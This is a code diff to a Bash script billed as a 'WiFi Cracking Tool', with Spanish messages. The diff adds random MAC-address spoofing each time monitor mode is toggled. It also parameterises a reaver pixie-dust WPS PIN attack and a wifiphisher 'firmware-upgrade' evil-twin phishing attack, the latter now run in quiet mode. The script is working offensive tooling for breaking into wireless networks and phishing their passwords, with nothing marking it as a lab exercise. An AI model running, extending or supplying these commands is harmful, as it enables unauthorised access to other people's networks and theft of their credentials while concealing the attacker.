@@ -55,6 +55,7 @@ enable_monitor_mode() {
 
     echo -e "\033[1;34m[+] Configurando $DEFAULT_INTERFACE en modo monitor...\033[0m" # Azul
     sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
+    sudo macchanger -r "$DEFAULT_INTERFACE" 
     sudo iw dev "$DEFAULT_INTERFACE" set type monitor && sleep 1
     sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1
 
@@ -97,6 +98,7 @@ disable_monitor_mode() {
 
     echo -e "\033[1;34m[+] Restaurando $DEFAULT_INTERFACE a modo gestionado...\033[0m" # Azul
     sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
+    sudo macchanger -r "$DEFAULT_INTERFACE" 
     sudo iw dev "$DEFAULT_INTERFACE" set type managed && sleep 1
     sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1
     sudo rfkill unblock wifi
@@ -243,7 +245,7 @@ crack_wps(){
     
     gnome-terminal -- bash -c "
     echo -e '\033[1;33m[+] Iniciando crackeo con WPS...\033[0m'; # Amarillo
-           sudo reaver -i wlan1 -b $CURRENT_BSSID -vv -K 1 -c $CURRENT_CHANNEL
+           sudo reaver -i $DEFAULT_INTERFACE -b $CURRENT_BSSID -vv -K 1 -c $CURRENT_CHANNEL
     bash";
     sleep 3
 }
@@ -253,7 +255,7 @@ crack_with_wifiphisher() {
    monitor_mode_isenable
     gnome-terminal -- bash -c "
     echo -e '\033[1;33m[+] Iniciando crackeo con WifiPhisher...\033[0m'; # Amarillo
-        sudo wifiphisher -iI wlan1 -p firmware-upgrade;
+        sudo wifiphisher -iI $DEFAULT_INTERFACE -p firmware-upgrade -qS;
         sudo service NetworkManager restart;
     bash";
    # Verificar si ya está en modo monitor
@@ -266,6 +268,7 @@ crack_with_wifiphisher() {
 
     echo -e "\033[1;34m[+] Configurando $DEFAULT_INTERFACE en modo monitor...\033[0m" # Azul
     sudo ip link set "$DEFAULT_INTERFACE" down && sleep 1
+    sudo macchanger -r "$DEFAULT_INTERFACE" 
     sudo iw dev "$DEFAULT_INTERFACE" set type monitor && sleep 1
     sudo ip link set "$DEFAULT_INTERFACE" up && sleep 1
 
@@ -283,28 +286,11 @@ crack_with_wifiphisher() {
 show_interfaces() {
     gnome-terminal -- bash -c "
         echo -e '\033[1;34m[+] Mostrando interfaces de red y su estado...\033[0m'  # Azul
-        interfaces=\$(ls /sys/class/net)
-        
-        for interface in \$interfaces; do
-            if iw dev \$interface info &>/dev/null; then
-                mode=\$(iw dev \$interface info | grep 'type' | awk '{print \$2}')
-                if [[ \$mode == 'monitor' ]]; then
-                    echo -e '\033[1;32m[+] \$interface está en modo monitor.\033[0m'  # Verde
-                else
-                    echo -e '\033[1;31m[-] \$interface NO está en modo monitor.\033[0m'  # Rojo
-                fi
-            else
-                echo -e '\033[1;31m[-] \$interface NO está disponible o no se puede obtener su estado.\033[0m'  # Rojo
-            fi
-        done
+        ip link show
         echo -e '\033[1;33m[+] Presione Enter para cerrar esta ventana...\033[0m'  # Amarillo
         read
     "
 }
-
-
-
-
  exit_system(){
     clear;
     echo -e "\033[1;34m Finalizando Dark Wolf Apps - WiFi Cracking Tool \033[0m";
